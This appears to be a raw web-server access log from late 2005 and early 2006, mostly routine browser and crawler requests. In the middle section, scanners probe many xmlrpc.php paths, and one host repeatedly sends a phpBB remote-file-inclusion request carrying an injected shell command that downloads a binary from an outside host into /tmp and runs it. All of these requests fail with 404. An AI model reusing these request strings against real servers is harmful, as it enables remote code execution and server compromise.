68.142.249.179 - - [13/Dec/2005:19:41:48 -0800] "GET /bridge-loan.html HTTP/1.0" 404 298 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
62.58.242.126 - - [17/Dec/2005:12:50:56 -0800] "POST /drupal/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:50:57 -0800] "POST /blog/xmlsrv/xmlrpc.php HTTP/1.1" 404 300 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:50:57 -0800] "POST /blogs/xmlsrv/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:50:58 -0800] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:50:58 -0800] "POST /blogs/xmlsrv/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:50:59 -0800] "POST /drupal/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:00 -0800] "POST /drupal/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:50:59 -0800] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:00 -0800] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:01 -0800] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:02 -0800] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:03 -0800] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:03 -0800] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:03 -0800] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:04 -0800] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:05 -0800] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:05 -0800] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:06 -0800] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:07 -0800] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:08 -0800] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
62.58.242.126 - - [17/Dec/2005:12:51:07 -0800] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:06 -0800] "GET /modules/Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo|  HTTP/1.1" 404 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:06 -0800] "GET /modules/Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo|  HTTP/1.1" 404 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:06 -0800] "GET /modules/Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo|  HTTP/1.1" 404 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:06 -0800] "GET /modules/Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo|  HTTP/1.1" 404 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:07 -0800] "GET /Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo|  HTTP/1.1" 404 323 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:07 -0800] "GET /Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo|  HTTP/1.1" 404 323 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:07 -0800] "GET /Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo|  HTTP/1.1" 404 323 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:07 -0800] "GET /Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo|  HTTP/1.1" 404 323 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:08 -0800] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:08 -0800] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:08 -0800] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:08 -0800] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:09 -0800] "POST /blog/xmlrpc.php HTTP/1.1" 404 293 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:09 -0800] "POST /blog/xmlrpc.php HTTP/1.1" 404 293 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:09 -0800] "POST /blog/xmlrpc.php HTTP/1.1" 404 293 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:09 -0800] "POST /blog/xmlrpc.php HTTP/1.1" 404 293 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:10 -0800] "POST /blog/xmlsrv/xmlrpc.php HTTP/1.1" 404 300 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:10 -0800] "POST /blog/xmlsrv/xmlrpc.php HTTP/1.1" 404 300 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:10 -0800] "POST /blog/xmlsrv/xmlrpc.php HTTP/1.1" 404 300 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:10 -0800] "POST /blog/xmlsrv/xmlrpc.php HTTP/1.1" 404 300 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:11 -0800] "POST /blogs/xmlsrv/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:11 -0800] "POST /blogs/xmlsrv/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:11 -0800] "POST /blogs/xmlsrv/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:11 -0800] "POST /blogs/xmlsrv/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:12 -0800] "POST /drupal/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:12 -0800] "POST /drupal/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:12 -0800] "POST /drupal/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:12 -0800] "POST /drupal/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:13 -0800] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:13 -0800] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:13 -0800] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:13 -0800] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:14 -0800] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:14 -0800] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:14 -0800] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:14 -0800] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:15 -0800] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:15 -0800] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:15 -0800] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:15 -0800] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:16 -0800] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:17 -0800] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:17 -0800] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:17 -0800] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:18 -0800] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:18 -0800] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:18 -0800] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
209.137.193.200 - - [17/Dec/2005:18:23:18 -0800] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
69.90.210.109 - - [18/Dec/2005:03:09:04 -0800] "GET / HTTP/1.1" 200 270 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.90.210.109 - - [18/Dec/2005:03:09:04 -0800] "GET /favicon.ico HTTP/1.1" 404 287 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.90.210.109 - - [18/Dec/2005:03:09:04 -0800] "GET /favicon.ico HTTP/1.1" 404 287 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.90.210.109 - - [18/Dec/2005:03:09:06 -0800] "GET /dbwa/ HTTP/1.1" 200 349 "http://69.90.210.81/" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.90.210.109 - - [18/Dec/2005:03:09:06 -0800] "GET / HTTP/1.1" 200 270 "http://69.90.210.81/dbwa/" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.90.210.109 - - [18/Dec/2005:03:09:07 -0800] "GET /dbwa/ HTTP/1.1" 200 349 "http://69.90.210.81/" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.90.210.109 - - [18/Dec/2005:03:09:08 -0800] "GET /dbwa/my/ HTTP/1.1" 401 968 "http://69.90.210.81/dbwa/" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:17 -0800] "GET /favicon.ico HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:19 -0800] "GET / HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:20 -0800] "GET / HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:20 -0800] "GET / HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:21 -0800] "GET / HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:21 -0800] "GET / HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:21 -0800] "GET / HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:22 -0800] "GET / HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:28 -0800] "GET / HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:29 -0800] "GET / HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:29 -0800] "GET / HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:29 -0800] "GET / HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:30 -0800] "GET / HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:06:30 -0800] "GET / HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:07:42 -0800] "GET / HTTP/1.1" 200 26 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
69.226.242.102 - - [03/Jan/2006:19:07:43 -0800] "GET / HTTP/1.1" 200 26 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
69.226.242.102 - - [03/Jan/2006:19:07:49 -0800] "GET / HTTP/1.1" 200 26 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:07:50 -0800] "GET / HTTP/1.1" 200 26 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:07:50 -0800] "GET / HTTP/1.1" 200 26 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:08:16 -0800] "GET / HTTP/1.1" 200 4 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
69.226.242.102 - - [03/Jan/2006:19:08:24 -0800] "GET / HTTP/1.1" 200 26 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
69.226.242.102 - - [03/Jan/2006:19:09:48 -0800] "GET / HTTP/1.1" 200 237 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:10:43 -0800] "GET / HTTP/1.1" 200 237 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:10:43 -0800] "GET / HTTP/1.1" 200 237 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:12:07 -0800] "GET / HTTP/1.1" 200 237 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:12:08 -0800] "GET / HTTP/1.1" 200 237 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:12:08 -0800] "GET / HTTP/1.1" 200 237 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:12:09 -0800] "GET / HTTP/1.1" 200 237 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:12:09 -0800] "GET / HTTP/1.1" 200 237 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:12:10 -0800] "GET / HTTP/1.1" 200 237 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:12:10 -0800] "GET / HTTP/1.1" 200 237 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:12:45 -0800] "GET / HTTP/1.1" 200 81 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:12:47 -0800] "GET / HTTP/1.1" 200 81 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:12:47 -0800] "GET / HTTP/1.1" 200 81 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:12:48 -0800] "GET / HTTP/1.1" 200 81 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:14:14 -0800] "GET / HTTP/1.1" 200 81 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:14:15 -0800] "GET / HTTP/1.1" 200 81 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:14:16 -0800] "GET / HTTP/1.1" 200 81 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:14:16 -0800] "GET / HTTP/1.1" 200 81 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:14:17 -0800] "GET / HTTP/1.1" 200 81 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:15:00 -0800] "GET / HTTP/1.1" 200 252 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:16:24 -0800] "GET / HTTP/1.1" 200 252 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:16:25 -0800] "GET / HTTP/1.1" 200 252 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:16:55 -0800] "GET / HTTP/1.1" 200 252 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
69.226.242.102 - - [03/Jan/2006:19:18:01 -0800] "GET / HTTP/1.1" 200 252 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:19:24 -0800] "GET / HTTP/1.1" 200 252 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
69.226.242.102 - - [03/Jan/2006:19:20:02 -0800] "GET / HTTP/1.1" 200 4080 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5"
